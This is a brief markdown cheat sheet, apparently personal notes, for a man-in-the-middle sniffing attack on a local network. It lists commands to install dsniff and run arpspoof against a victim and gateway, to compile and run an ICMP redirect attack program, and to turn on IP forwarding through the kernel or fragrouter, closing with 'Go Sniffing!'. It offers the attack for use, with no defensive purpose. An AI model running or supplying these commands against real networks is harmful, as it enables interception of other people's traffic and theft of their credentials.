#Scenario

###arpredirect
$ sudo apt-get install dsniff
$ arpspoof -i <eth0> -t <Victim IP> <Victim Gateway IP>

###icmpredirect

$ gcc -o icmp_redir_att icmp_redir_att.c
$ ./icmp_redir_att <Victim Gateway IP> <Victim IP> <Des Victim;DNS?> <MyIP>

###Packet Routing
 
Kernel based Routing
$echo 1 > /proc/sys/net/ipv4/ip_forward
 
Application based Routing
$fragrouter -B1


The End! Go Sniffing!

icmpredirect, It is impossible for newest OS.
